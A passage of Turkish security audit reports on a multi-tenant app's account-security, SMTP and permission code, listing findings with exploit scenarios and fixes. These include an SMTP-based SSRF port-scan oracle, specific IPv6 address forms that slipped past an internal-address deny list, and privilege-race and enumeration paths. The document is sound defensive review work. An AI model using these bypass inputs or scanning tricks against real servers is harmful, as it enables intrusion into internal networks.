Kurtarma kodu HMAC'i düz kod bilinmeden yeni anahtarla yeniden hesaplanamaz. TOTP/SMTP için yeniden şifreleme işi de yok. Bir sürüm `APP_ENCRYPTION_KEYS`'ten çıkarılırsa o sürümle yazılmış kodlar ve sırlar okunamaz. Runbook'a şu yazılmalı: "Eski sürüm, ona bağlı veri kalmayana kadar listede tutulur." Kodda değişiklik gerekmez. (devops: runbook)

### [BİLGİ] TLS ad doğrulaması testi yalnız örtük TLS'i (465) kapsıyor

`mail-tls-p10.test.ts` yalnız SSL yolunu test ediyor. STARTTLS yolu nodemailer'da aynı mantıkla çalışıyor (`smtp-connection/index.js:1115-1117`: `tls.servername` → `opts.servername`) ve Node `checkServerIdentity` `servername`'i kullanıyor; bu yüzden risk yok. İsteğe bağlı olarak 587 + STARTTLS için de bir test eklenebilir. (backend-dev)

### [BİLGİ] Ayar kaydı ve test öncesi netguard anında 400 dönüyor

`smtp-routes.ts:24`: Bu hata yolu 12 sn tabanının dışında. Yalnız "bu ad şu an özel bir IP'ye çözülüyor mu" bilgisini veriyor; bunu saldırgan kendi DNS sorgusuyla da öğrenebilir. Kabul edilebilir.

## Koordinatör kararı — SMTP hata sınıfı audit'te kalıyor: KABUL

Gerekçe: Port allowlist sonrası sınıf (connect/tls/auth/rejected) yalnız 4 SMTP portunda ve yalnız tenant'ın kendi audit kaydında görülüyor. Bu bilgi internetteki herkesin aynı portlara doğrudan bağlanarak öğrenebileceğinden fazla değil. Yanıt süresi 12 sn'ye eşitlendi, kendi IP ve iç ağ engelli. Platform bu bilgiyle anlamlı bir tarayıcıya dönüşmüyor. Koşul: P11 audit ekranı `reason` dışında ham hata metni, yanıt kodu veya karşı sunucunun banner'ını göstermemeli. Bugün `newValue`'da yalnız `reason` var (`service.ts:159`, `smtp-routes.ts:28`); `responseCode` yalnız sunucu logunda.

## Tur 1'de incelenmeyen maddeler — tamamlandı

- **nodemailer `tls.servername`:** Kaynakta doğrulandı (`smtp-connection/index.js:176,320-322,1115-1117`). `mail-tls-p10.test.ts:69-77` IP'ye bağlanıyor; doğru adla başarılı, yanlış adla `tls` hatası alınıyor ve ileti gitmiyor. Sorun yok.
- **Web `session-watch.tsx` boşta yoklama:** `shouldProbe` bir boşta kalma döneminde yalnız bir yoklama yapıyor (31,5 dk > sunucunun 30 dk sınırı). Yoklama oturumu canlı tutan bir döngü kurmuyor. Görünürlük yoklaması etkinlikten en az 60 sn sonra yapılıyor ve oturumu yalnız zaten geçerliyse uzatıyor. Sorun yok.
- **Kurtarma kodu indirme:** Kodlar istemcide Blob + `createObjectURL` ile indiriliyor, URL 1 sn sonra iptal ediliyor. Kodlar ağa ya da kalıcı depoya (localStorage/sessionStorage) yazılmıyor. Sorun yok.
- **CSP (`apps/web/proxy.ts:18-33`):** nonce + `strict-dynamic` kullanılıyor; production'da `unsafe-inline`/`unsafe-eval` yok. `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `form-action 'self'` var. `connect-src` self + wss. Sorun yok.
- **AC-151 `/settings/support-requests/email/test` yetkisi:** Plugin seviyesinde `requireAuth` (CSRF dahil) + `requirePerm("settings.edit")` hook'u var (`requests/routes.ts:89-90`), `tenantScope` ile tenant kapsamı uygulanıyor, SMTP testiyle ortak 5/dk/tenant kovası kullanılıyor. Sorun yok.

## Otomatik tarama çıktıları

- `pnpm audit --prod --audit-level=moderate`: **No known vulnerabilities found**
- gitleaks v8.30.1 `dir` (`.gitleaks.toml`, pipe yok):
  - `apps/server/src` → GITLEAKS_EXIT=0
  - `apps/server/test` → GITLEAKS_EXIT=0
  - `packages` → GITLEAKS_EXIT=0
  - `docs` → GITLEAKS_EXIT=0
  - `apps/web/app` → GITLEAKS_EXIT=0
  - `apps/web/lib` → GITLEAKS_EXIT=0
  - `apps/web/e2e` → GITLEAKS_EXIT=0

## Tasarımda vaat edilip kodda bulunmayanlar

- `netguard.ts:6` yorumu "sunucunun kendi genel IP'si de hedef olamaz" diyor; DNS hatasında bu garanti tutmuyor (B-P10-10).
- `mail/service.ts:4` yorumu "deneme başına mutlak tavan" diyor; tavan yanıta uygulanıyor ama sokete uygulanmıyor (B-P10-11).

## Olumlu

2000::/3 allowlist yaklaşımı, kara liste yamalarından çok daha sağlam; denenen tüm özel/geçiş aralıkları kapandı. AAD, HKDF ile anahtar ayrımı ve koşullu `mfaEnable` UPDATE'i doğru kuruldu. Hata mesajının tekleştirilmesi ve süre tabanı, Tur 1'deki kâhini fiilen ortadan kaldırdı.

## Sonra listesine öneri

B-P10-10, B-P10-11 ve anahtar emekliye ayırma runbook notu `docs/gereksinimler.md` §9'a "Sonra" olarak eklensin. B-P10-11 prod açılışından önce kapatılmalı (öneri).

---

# Güvenlik Raporu — P10 (hesap güvenliği + SMTP) — Kod turu 1 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0). Prod açılışından önce Orta bulgular kapatılmalı (öneri).
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 7

Kapsam: çalışma ağacı (son commit beb97ea üstü diff + izlenmeyen dosyalar). `apps/agent-win` kapsam dışı. Testler koşulmadı. Kod okundu; netguard'a gerçek girdi denemesi yapıldı.

## Bulgular (öncelik sırasıyla)

### [ORTA] B-P10-1 SMTP hedefinde port kısıtı yok, sunucunun kendi genel IP'si engellenmiyor — A10 SSRF

Yer: `packages/contracts/src/api/tenants.ts` (`smtpSettingsInputSchema.port` 1–65535), `apps/server/src/lib/netguard.ts:7-12`, `apps/server/src/mail/service.ts:44-50, 79-109`, `apps/server/src/tenants/smtp-routes.ts:18-29`
Sorun: Özel, loopback, CGNAT ve link-local aralıkları doğru engelleniyor. Ama port serbest. Yayın sunucusunun kendi genel IP'si (ve aynı makinedeki diğer servisler) da engellenmiyor. Hata sınıfları (`connect`/`tls`/`auth`/`rejected`) ve yanıt süresi (anında ret ile 10 sn zaman aşımı arasındaki fark) bir kâhin (oracle) oluşturuyor.
İstismar senaryosu: `settings.edit` yetkisi olan bir tenant Admin'i host olarak sunucunun genel adını/IP'sini ya da herhangi bir internet hostunu, port olarak 22/3306/4444 gibi değerleri girer. "SSL" ile 443'e bağlanınca `tls` hatası, kapalı portta anında `connect`, açık ama SMTP olmayan portta 10 sn sonra `connect` alır. 5/dk/tenant sınırıyla yavaş ama sürekli bir port taraması yapılabilir. Platform başka hedeflere karşı tarayıcı olarak kullanılır; sunucu IP'si kara listeye girebilir. Ayrıca SMTP komutları SMTP olmayan servislere gönderilebilir (protokoller arası saldırı).
Düzeltme: Port allowlist'i koyun: 25, 465, 587, 2525 (sözleşme zod + sunucu). `PUBLIC_BASE_URL` hostunun çözüldüğü IP'leri ve isteğe bağlı bir `NETGUARD_EXTRA_DENY` listesini netguard'a ekleyin. Kullanıcıya dönen hata metnini tek bir genel mesaja indirin (sınıf yalnız logda kalsın) ya da en azından `connect` ile zaman aşımını aynı süreye eşitleyin. (atanan: backend-dev)

### [ORTA] B-P10-2 Yeni test dosyası gitleaks'e takılıyor, CI gizli bilgi kapısı kırmızı — A05 / G-18

Yer: `apps/server/test/integration/account-p10.test.ts:199` (`generic-api-key`, sahte SMTP şifresi `password: "..."`)
Sorun: `gitleaks dir apps/server/test` çıkış kodu 1 verdi. Değer sahte ama CI gitleaks adımı başarısız olacak ve gerçek sızıntıları gürültüde saklayacak.
İstismar senaryosu: Doğrudan istismar yok. Kapı kırmızıyken "geçici" yol istisnası eklenmesi alışkanlığı oluşur (G-18'in amacı bozulur).
Düzeltme: Sahte değeri `apps/server/test/helpers/secrets.ts`'e taşıyın (allowlist'teki tek kaynak) ya da satır içi `// gitleaks:allow` + gerekçe ekleyin (B-P9-1 kalıbı). `.gitleaks.toml`'a yeni yol istisnası eklemeyin. (atanan: backend-dev)

### [DÜŞÜK] B-P10-3 `mfaSetupEnforcement:false` production'da reddedilmiyor (yorumdaki vaat kodda yok) — A04

Yer: `apps/server/src/app.ts:132`, `apps/server/src/auth/session.ts:36-43` (yorum "production'da buildApp reddeder")
Sorun: `buildApp` değeri env'e bakmadan doğrudan modül genelindeki değişkene yazıyor. Bugün `server.ts:11` bu değeri vermiyor, bu yüzden prod güvende. Ancak tek bir yanlış çağrı zorunlu 2FA kurulumunu sessizce kapatır. Değişken modül seviyesinde global olduğu için aynı süreçteki son `buildApp` çağrısı hepsini etkiler.
Düzeltme: `if (deps.mfaSetupEnforcement === false && env.NODE_ENV === "production") throw ...` ekleyin ve bunu bir birim testiyle sabitleyin. (atanan: backend-dev)

### [DÜŞÜK] B-P10-4 netguard IPv6 boşlukları — A10

Yer: `apps/server/src/lib/netguard.ts:12`
Sorun: Deneme sonucu: `::127.0.0.1` / `::7f00:1` (IPv4-compatible), `2002:7f00:1::` (6to4), `64:ff9b:1::/48` (yerel NAT64), `fec0::/10` ve `::ffff:0:0:0/96` (SIIT) engellenmiyor. IPv4-mapped (`::ffff:7f00:1`), onluk/sekizlik/onaltılık IPv4 biçimleri, CGNAT ve 169.254.169.254 doğru engelleniyor. Onluk ve sekizlik biçimler zod `new URL` normalizasyonu ve çözümlenen IP kontrolü ile yakalanıyor.
İstismar senaryosu: Konteynerde IPv6 ya da NAT64 açıksa iç hedefe yol açılabilir. Bugünkü dağıtımda (Docker, IPv6 kapalı) olasılık düşük.
Düzeltme: V6 listesine `::/96`, `::ffff:0:0:0/96`, `2002::/16`, `64:ff9b:1::/48`, `fec0::/10`, `2001::/32` (Teredo) eklenmeli. Daha basit yol: IPv6'yı yalnız global unicast `2000::/3` ile sınırlayın. (atanan: backend-dev)

### [DÜŞÜK] B-P10-5 Güvenlik "Yok" + kimlik bilgisi → SMTP şifresi düz metin gider — A02

Yer: `apps/server/src/mail/service.ts:89-91` (`ignoreTLS: true` + `auth`)
Sorun: `security: "NONE"` ile kullanıcı adı/şifre birlikte kaydedilebiliyor. Nodemailer AUTH'u şifresiz kanaldan gönderir.
Düzeltme: Sözleşmede `security === "NONE"` iken `user/password` alanlarını reddedin ya da UI'da açık bir uyarı gösterin. Tercih edilen: ret. (atanan: backend-dev, frontend-dev)

### [DÜŞÜK] B-P10-6 Şifresi ele geçmiş, 2FA'yı henüz kurmamış hesapta saldırgan kendi TOTP'sini bağlayabilir — A07

Yer: `apps/server/src/auth/account.ts:62-100`, `apps/server/src/auth/routes.ts:64-76`
Sorun: Zorunlu 2FA kurulum aşaması yalnız şifreyle açılıyor. İlk kurulumda ikinci bir doğrulama yok. Bu, tasarımın doğal sonucu. Etkinleştirme diğer oturumları iptal ettiği için gerçek kullanıcı oturumdan atılır ve hesap fiilen saldırgana geçer. Ayrıca `mfaEnable` doğrulanan sırrı UPDATE koşuluna bağlamıyor (`account.ts:90`). Aynı kullanıcı paralel `setup` çağırırsa doğrulanmamış bir sırla etkinleşebilir. Etkisi düşük: yalnız kullanıcının kendisini etkiler.
Düzeltme: Etkinleştirmede kullanıcıya bildirim e-postası gönderin ("2FA etkinleştirildi, siz değilseniz yöneticinize başvurun"). UPDATE'e `totpSecretEnc: <yüklenen değer>` koşulunu ekleyin. (atanan: backend-dev)

### [DÜŞÜK] B-P10-7 Kurtarma kodu hash'i tuzsuz SHA-256 (50 bit) — A02

Yer: `apps/server/src/auth/mfa.ts:56-62`
Sorun: Çevrimiçi saldırı 5/5 dk sınırıyla pratik değil. Ancak DB dökümü sızarsa tuzsuz ve hızlı hash, 50 bit uzayda GPU ile çevrimdışı kırılabilir. Kodlar çok hedefli: tüm kullanıcıların kodları aynı anda denenebilir.
Düzeltme: Sunucu tarafı gizli bir anahtarla HMAC-SHA256 kullanın (ör. `SESSION_REF_KEY` türevi) ya da entropiyi 80 bite çıkarın (16 karakter). (atanan: backend-dev)

### [DÜŞÜK] B-P10-8 AES-GCM'de AAD bağlaması yok — A02

Yer: `apps/server/src/lib/crypto.ts:18-41`
Sorun: Şifreli değer satıra/sütuna bağlı değil. DB'ye yazma yetkisi olan biri bir tenant'ın `smtp_pass_enc` değerini başka satıra ya da `totp_secret_enc` sütununa taşıyabilir. IV her şifrelemede rastgele 12 bayt; GCM'in anahtar başına ~2^32 sınırı bu hacimde sorun değil. Sürüm baytı ve rotasyon doğru. Env doğrulaması 32 bayt, tekil sürüm ve prod'da zorunluluk kontrol ediyor.
Düzeltme: `setAAD(Buffer.from("tenant_settings.smtp_pass_enc:" + tenantId))` biçiminde tablo/sütun/satır bağlaması ekleyin. Mevcut veri için sürüm baytında yeni bir biçim tanımlayın. (atanan: backend-dev)

### [DÜŞÜK] B-P10-9 2FA deneme sınırı ve kilit e-postası kötüye kullanılarak gerçek kullanıcı rahatsız edilebilir — A04

Yer: `apps/server/src/auth/account.ts:30, 78, 107` (sınır anahtarı `userId`, bellek içi), `apps/server/src/auth/service.ts` `recordFailure` → `onLock`
Sorun: (a) Şifreyi bilen saldırgan yarım oturumla 5 hatalı kod girerek gerçek kullanıcının 2FA doğrulamasını 5'er dakika kilitli tutabilir. (b) Hesap geneli kilit (20/sa) her tetiklendiğinde bildirim e-postası gidiyor. Birkaç IP ile saatte ~4 kilit e-postası gönderilebilir. Bu, tasarımdaki (G-23) kabul edilmiş DoS'un e-posta boyutu. Sayaç bellek içi olduğu için yeniden başlatmada sıfırlanıyor (tek instance, ADR-0005 ile tutarlı).
Düzeltme: Kilit e-postasına kullanıcı başına bir soğuma süresi koyun (ör. 1 saatte 1). 2FA sınırını `userId+ipKey` ve `userId` (daha gevşek) olarak ikiye ayırmayı değerlendirin. (atanan: backend-dev)

## Odak maddeleri — doğrulanan (sorun yok)

- **TOTP:** RFC 6238 (HMAC-SHA1, dinamik kesme, 6 hane, 30 sn), ±1 adım. `safeEqual` SHA-256 + `timingSafeEqual` kullanıyor, uzunluktan bağımsız (`lib/ids.ts:50`). Sır 160 bit CSPRNG. Tekrar kullanım koruması: TX içinde `totpLastStep < step` koşullu `updateMany`; aynı ya da daha eski adım ikinci kez kabul edilmiyor, yarışta tek satır kazanır (`account.ts:121`). Kurtarma kodu koşullu `usedAt: null` UPDATE ile tek kullanımlık (`account.ts:124`).
- **Oturum sabitleme (session fixation):** verify başarılı olunca eski oturum iptal ediliyor, yeni token ve CSRF üretiliyor, mutlak bitiş süresi taşınıyor, süre uzamıyor (`account.ts:127-128`).
- **Yarım oturum:** `requireAuth` `verify`/`setup` aşamasında yalnız izinli uçlara izin veriyor (`guards.ts:51-52`). `/auth/me` yetki ve acting tenant döndürmüyor. WS (`requests/ws.ts:129,149`, `signaling/ws.ts:104,232`) `allowPartial=false` kullanıyor, yarım oturum reddediliyor. Etkinleştirmede diğer oturumlar iptal ediliyor ve panel soketleri kapatılıyor.
- **Şifre sıfırlama:** 256 bit token, DB'de SHA-256 tutuluyor, 30 dk TTL. Koşullu tek kullanım var (`account.ts:200`); diğer açık token'lar ve tüm oturumlar aynı TX'te iptal ediliyor, `endLive` çağrılıyor. Bağlantı `env.PUBLIC_BASE_URL`'den üretiliyor, Host başlığı kullanılmıyor (link zehirleme yok). Token URL parçasında (`#token=`), sayfa açılınca `history.replaceState` ile temizleniyor (`reset-form.tsx`). Global `Referrer-Policy: no-referrer` var. forgot her durumda 202 dönüyor, iş `setImmediate` ile yanıttan sonra yapılıyor (zamanlama sızıntısı yok); IP 10/sa, hesap 3/sa. Şifre değişiminde açık sıfırlama token'ları da iptal ediliyor.
- **SMTP:** Şifre AES-GCM ile saklanıyor, GET yanıtı yalnız `hasPassword` döndürüyor, audit'te `"***"` görünüyor. Kayıt ve test öncesi netguard çalışıyor. Bağlantı çözümlenen IP'ye yapılıyor (`servername` = ad, `rejectUnauthorized: true`), DNS rebinding yok. STARTTLS'te `requireTLS` olduğu için düşürme (downgrade) yok. Başlık enjeksiyonu: `to` zod e-posta ile doğrulanıyor (virgül/CRLF kabul edilmiyor), gönderen adı kontrol karakteri reddiyle ve nesne olarak geçiyor, konu `oneLine` ile temizleniyor. Şablonlardaki tüm değişken HTML `esc` ile kaçışlı. Tenant izolasyonu `tenantScope` + `settings.edit` ile sağlanıyor.
- **`/sessions/:id/email`:** Yalnız oturumun kendi teknisyeni ve PENDING durumundaki oturum için çalışıyor. Link öneki `PUBLIC_BASE_URL/session/` olmalı ve `sha256(token) == tokenHash` sabit zamanlı karşılaştırılıyor, yani başka bir adres gönderilemez. 20/sa sayımı `users FOR UPDATE` ile TX içinde yapılıyor, yarış yok. Alıcı serbest (tasarım gereği) ve gönderim tenant'ın kendi SMTP'si üzerinden yapılıyor.
- **logout-all / reset-mfa:** logout-all yalnız kendi oturumlarını kapatıyor. reset-mfa tenant kapsamında; kendi hesabına 403, daha geniş yetkili hesaba 403 dönüyor. Kurtarma kodları siliniyor, oturumlar iptal ediliyor. Super Admin hesabı tenant kapsamı dışında kaldığı için ulaşılamıyor.
- **Bağımlılık lisansları:** nodemailer 10.5.0 MIT-0, qrcode 1.5.4 MIT, smtp-server 3.21.4 (dev) MIT-0. AGPL/GPL yok.

## Otomatik tarama çıktıları

- `pnpm audit --prod --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `dir` (`.gitleaks.toml`):
  - `apps/server/src` → GITLEAKS_EXIT=0
  - `apps/server/test` → GITLEAKS_EXIT=1 (1 bulgu, `account-p10.test.ts:199`, B-P10-2)
  - `apps/web` → GITLEAKS_EXIT=1; 13 bulgunun **13'ü de `.next/` derleme çıktısında**, kaynakta 0 (sayılmadı)
  - `packages` → GITLEAKS_EXIT=0
  - `docs` → GITLEAKS_EXIT=0

## Tasarımda vaat edilip kodda bulunmayanlar

- `session.ts:38` yorumu "production'da buildApp reddeder" diyor; kodda bu kontrol yok (B-P10-3).
- Mimari T22'de "Docker ağı" engeli 172.16/12 ile karşılanıyor. Port kısıtı ise tasarımda açıkça yazmıyor; öneri B-P10-1.

## İncelenmeyen veya kısmen incelenen

- Nodemailer 10.x `dist` paketinde `tls.servername` değerinin IP host ile sertifika doğrulamasına gerçekten geçtiği kaynak kodda doğrulanamadı (paket derlenmiş). Entegrasyon testinde, IP'ye bağlanıp yanlış adlı sertifikanın reddedildiğini gösteren bir test olup olmadığına bakılmalı (backend-dev).
- Web: `session-watch.tsx` (boşta yoklama), kurtarma kodu indirme bileşeni ve 2FA sayfalarına yalnız yüzeysel bakıldı. `proxy.ts`'teki CSP ve Referrer-Policy başlıklarının mevcut olduğu görüldü, CSP içeriği yeniden denetlenmedi.
- `requests/service.ts` AC-151 e-posta kanalı test ucu: `sendTenantTest` ile ortak gövde ve aynı 5/dk sınırı paylaşıldığı görüldü; rota yetkisi ayrıca okunmadı.

## Olumlu

Ortak `safeEqual`, koşullu UPDATE kalıbı ile tek kullanım ve tekrar kullanım koruması, verify'da token yenileme, yarım oturumun WS'den dışlanması, URL parçasında token ve geçmişten silinmesi, `PUBLIC_BASE_URL`'den link üretimi ve netguard'ın çözümlenen IP'ye bağlanması P10'un çekirdek kontrollerini sağlam kılıyor.

## Sonra listesine öneri

B-P10-3..9 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklensin. B-P10-1 ve B-P10-2 prod açılışından önce kapatılmalı (öneri).

---

# Güvenlik Raporu — P9 (kullanıcı/yetki/tenant yönetimi) — Kod turu 2 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0)
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 5 (B-P9-2..6 taşınan, Sonra listesinde) — yeni bulgu yok

Kapsam: Bu tur dar kapsamlı. Üç konuya bakıldı:

- Tur 1 B-P9-1'in kapanışı.
- B-P9-2..6'nın Sonra listesine yazılması.
- Frontend `apps/web/lib/users/form.ts` `buildUpdateUser` değişikliği: rol değişince tüm anahtarlar ekrandaki değerleriyle gönderiliyor. Bunun AC-73 ve yetki yükseltme açısından etkisi, sunucu tarafında (`apps/server/src/users/service.ts`) doğrulandı.

`apps/agent-win` kapsam dışı (ayrı rapor: `docs/guvenlik-raporu-0.10.2.md`). Testler tekrar koşulmadı.

## Tur 1 bulgularının durumu

| Bulgu                                     | Durum             | Kanıt                                                                                                                                                                                                                                                                                                                                          |
| ----------------------------------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B-P9-1 (Orta) gitleaks yanlış pozitifleri | **Kapandı**       | `apps/server/src/lib/ids.ts:40`: satır içi `// gitleaks:allow`, aynı satırda gerekçeli. `apps/web/e2e/mock-users.mjs:173`: `// gitleaks:allow`, gerekçe bir üst satırda (`:172`). İstisnalar satır düzeyinde; `.gitleaks.toml`'a yol ya da kural istisnası eklenmedi. `gitleaks dir` sonucu: `apps/server/src` ve `apps/web/e2e` çıkış kodu 0. |
| B-P9-2..6 (Düşük)                         | **Sonra** (kabul) | `docs/gereksinimler-sonra-acik.md:9-13` "P9'dan" tablosu. Her satırda düzeltme yönü ve atanan ajan (backend-dev) yazılı.                                                                                                                                                                                                                       |

## `buildUpdateUser` rol değişimi — sunucu doğrulaması: GÜVENLİ

Yer: `apps/web/lib/users/form.ts:81-95` (istemci), `apps/server/src/users/service.ts:83-104, 157-189` (sunucu).

Yetki kararı istemcinin gönderdiği gövdeye değil, sunucunun hesapladığı **etkin küme farkına** dayanıyor. Bu yüzden gövdede fazladan anahtar göndermek tek başına hiçbir yetki vermiyor:

1. `normalizeRows(role, cur.permissions, input.permissions)`, yeni rolün varsayılanına göre ezme satırlarını üretiyor. `after = effectiveOf(role, rows)` (`service.ts:166-167`).
2. `changed = diffKeys(before, after)` yalnız etkin değeri DEĞİŞEN anahtarları veriyor. `assertGrantable(auth, changed)` bu anahtarların her birini aktörün kümesinde arıyor (`:168, :171`). Açıkça gönderilen ama etkin değeri değişmeyen anahtar kontrolden muaf; bu da zararsız, çünkü kimseye yetki kazandırmıyor.
3. Rol geçişinin kendisi kapsamda. USER→ADMIN'de gövdede olmayan anahtar ADMIN varsayılanıyla açık hesaplanıyor ve "verme" sayılıyor. Kilitli (aktörde olmayan) bir anahtar `false` gelirse farkta yer almıyor, 200 dönüyor. `true` gelirse farkta yer alıyor, 403 dönüyor. Sunucu testi tam bu üç durumu kapsıyor: `apps/server/test/integration/users-p9.test.ts:191-193`.
4. ADMIN→USER'da hedefin açık her anahtarı aktörde de var, çünkü önce `canManage(auth, before)` çalışıyor (`:165`). Bu yüzden ekrandaki değerlerle gönderilen hiçbir anahtar aktörün dışına taşamıyor. UI rol değişiminde `applyRoleDefaults` ile kilitli olmayan anahtarları yeni rolün varsayılanına çekiyor (`user-editor.tsx:64`). Kullanıcı açık bıraktığı anahtarları bilinçli olarak "ezme" satırı yapmış oluyor ve bunların hepsi aktörün sahip olduğu yetkiler.
5. Kendi hesabı: rol değişirse `roleChanged` 403 döner (`:170`). Super Admin hedefi `lockUser`/`scoped` ile 404 döner. Tanım dışı anahtar zod'da 400 döner.
6. Bayat ekran durumu, yani başka bir Admin'in arada yaptığı değişikliğin üzerine yazılması (lost update), yalnız aktörün zaten verebileceği anahtarlarla sınırlı. Her etkin değişiklik yine `assertGrantable`'dan geçiyor. Bu durum yetki yükseltme değil; B-P9-2 (TOCTOU, Sonra) ile aynı sınıfta kalıyor ve yeni bulgu açılmadı.
7. Audit (AC-74): `permissionAudits` yalnız etkin farkı yazıyor. Değişmeyen anahtarları açıkça göndermek sahte audit satırı üretmiyor.

İstemci birim testi sunucu kuralını birebir modelliyor: `apps/web/lib/users/users.test.ts:144-165`, USER→ADMIN, kilitli `audit.export` → `false`, sunucu kümesi ekranla aynı.

## Otomatik tarama çıktıları

gitleaks v8.30.1, `dir` modu, `--config .gitleaks.toml --redact`, çalışma ağacı (staged değil):

| Dizin             | Çıkış kodu            |
| ----------------- | --------------------- |
| `apps/server/src` | 0                     |
| `apps/web/e2e`    | 0                     |
| `apps/web/lib`    | 0                     |
| `apps/web/app`    | 0                     |
| `packages`        | 0                     |
| `docs`            | 1 → 0 (aşağıdaki not) |

Not (`docs`): Tek bulgu `generic-api-key`, yeri `docs/guvenlik-raporu.md` "P9 — Kod turu 1" B-P9-1 "Yer" satırı. Sebep, bu raporun mock dosyasındaki sahte e2e değerini düz alıntılamasıydı (kodda değil, raporun kendisinde). Değer bu turda rapordan maskelendi (`"<sahte e2e değeri>"`); kod tarafında değişiklik yok. Maskelemeden sonra `docs` taraması tekrar koşuldu: `GITLEAKS_EXIT=0`.

Bağımlılıklar bu turda değişmedi, `pnpm audit` tekrarlanmadı. Geçerli sonuç tur 1'deki: "No known vulnerabilities found".

## Tasarımda vaat edilip kodda bulunmayanlar

Yeni bir şey yok. Mimari-e10 §3.4 kesişimi (B-P9-6) Sonra listesinde.

## Olumlu

- İstisnalar satır düzeyinde ve gerekçeli. Toplu yol istisnası eklenmediği için CI kapısı gerçek sızıntılara karşı açık kalıyor.
- Yetki kararı sunucuda etkin küme farkıyla veriliyor. İstemci gövde biçimini değiştirse bile AC-73 korunuyor; istemci yalnız UX'i (gereksiz 403'ü) düzeltti.
- Sunucu kuralı istemci testinde modellenmiş, sunucu entegrasyon testi de aynı üç durumu doğruluyor.

Öneri: B-P9-2..6 Sonra listesinde. P9 için güvenlik kapısı açık (Kritik/Yüksek 0).

---

# Güvenlik Raporu — P9 (kullanıcı/yetki/tenant yönetimi) — Kod turu 1 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0)
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 5

Kapsam: commit edilmemiş P9 değişiklikleri — `apps/server/src/{users,tenants}/*`, `auth/guards.ts` (`requireSuperAdmin`), `lib/ids.ts` (`newTemporaryPassword`), `signaling/rooms.ts` (`endByTenant`), `requests/hub.ts` (`closeByTenant`), `public/consent.ts`, `packages/contracts/src/{api/users,api/tenants,permissions,audit}.ts`, `apps/web/app/(panel)/{users,admin,tenant-switcher.tsx}`, `components/admin/permission-matrix.tsx`. `apps/agent-win` (0.10.2) kapsam dışı. Testler koşulmadı.

## Bulgular (öncelik sırasıyla)

### [ORTA] B-P9-1 gitleaks CI kapısını kıracak iki yanlış pozitif — A05 Güvenlik yapılandırması

Yer: `apps/server/src/lib/ids.ts:40` (`TEMP_PASSWORD_ALPHABET`), `apps/web/e2e/mock-users.mjs:172` (sahte `temporaryPassword: "<sahte e2e değeri>"`)
Sorun: İkisi de gizli bilgi değil (alfabe sabiti / e2e sahte değeri). Ancak `generic-api-key` kuralına takılıyorlar. Commit edildiğinde CI gitleaks adımı kırmızı olur ve gerçek bir sızıntıyı gizleyecek "toplu istisna" baskısı doğar.
İstismar senaryosu: Doğrudan istismar yok. Risk, CI kapısının devre dışı bırakılması veya geniş istisna eklenmesi.
Düzeltme: Satır içi `// gitleaks:allow` (her iki satıra, gerekçe yorumuyla) ya da `.gitleaks.toml`'a TEK dosya yolu istisnası (`mock-users.mjs`). Alfabe sabitine dosya istisnası eklenmez, satır içi istisna yeterli. (atanan: backend-dev — ids.ts; frontend-dev — mock-users.mjs)

### [DÜŞÜK] B-P9-2 Aktörün yetkisi TX dışında okunuyor; eşzamanlı karşılıklı düşürme — A01 Bozuk erişim kontrolü (TOCTOU)

Yer: `apps/server/src/users/service.ts:162-173`, `:214-218` (yalnız hedef satır `FOR UPDATE`; `auth.permissions` istek başında `resolveSession`'dan gelir)
Sorun: Eşit yetkili iki Admin aynı anda birbirini USER'a düşürür veya pasife alırsa ikisi de başarılı olur. Benzer şekilde, yetkisi o anda daraltılan bir Admin'in uçuştaki isteği eski kümeyle `assertGrantable`'dan geçer. Pencere milisaniyeler.
İstismar senaryosu: Yetkisi kaldırılmak üzere olan Admin, yarış penceresinde bir USER'a kendi (artık kaybettiği) yetkisini verebilir.
Düzeltme: TX içinde aktör ve hedef satırlarını id sırasıyla `FOR UPDATE` kilitleyin. Aktörün durumunu, rolünü ve etkin yetkisini TX içinde yeniden okuyun. `canManage` ve `assertGrantable` bu tazeye karşı çalışsın. (atanan: backend-dev)

### [DÜŞÜK] B-P9-3 409 e-posta çakışması tenant'lar arası hesap varlığını sızdırır — A01/A07 Enumeration

Yer: `apps/server/src/users/service.ts:44, 152, 189`
Sorun: E-posta sistem genelinde tekil olduğundan, `users.create`/`users.edit` sahibi tenant Admin'i başka firmadaki (ve Super Admin) e-postaların varlığını 409 ile yoklayabilir. Uçta hız sınırı yok (B-P9-4).
İstismar senaryosu: Kötü niyetli tenant Admin, aday listesini PATCH e-posta alanıyla tarar ve Super Admin giriş kimliğini doğrular. Bu bilgi, oltalama veya parola püskürtme için hedef çıkarır.
Düzeltme: Tasarım kararı (giriş kimliği tekil) korunabilir. Ancak (a) yönetim uçlarına kullanıcı başı hız sınırı uygulanmalı, (b) 409'lar `result: "fail"` ile audit'e yazılmalı. Sonra listesine aday. (atanan: backend-dev)

### [DÜŞÜK] B-P9-4 /users ve /admin/* yazma uçlarında hız sınırı yok — A04 Güvensiz tasarım

Yer: `apps/server/src/users/routes.ts:40-69`, `apps/server/src/tenants/routes.ts:60-88`
Sorun: `POST /users` her çağrıda şifre hash'i (CPU-pahalı) üretir. Sınır yok; yetkili bir hesap (veya ele geçirilmiş oturum) CPU tüketebilir ve toplu hesap açabilir.
Düzeltme: Mevcut `FixedWindowCounter` deseniyle kullanıcı başı ör. 30 yazma/dk, `POST /users` için 10/dk; aşımda `RATE_LIMITED`. (atanan: backend-dev)

### [DÜŞÜK] B-P9-5 Reddedilen yetki işlemleri audit'e düşmüyor — A09 Loglama eksikliği

Yer: `apps/server/src/users/service.ts:97-104` (`assertGrantable`), `:166`, `:172`, `:218` (`canManage`/kendi hesabı 403)
Sorun: AC-73 reddi ve "daha geniş yetkili hesabı düzenleme" denemeleri iz bırakmıyor. Bunlar yetki yükseltme denemesinin ana sinyali.
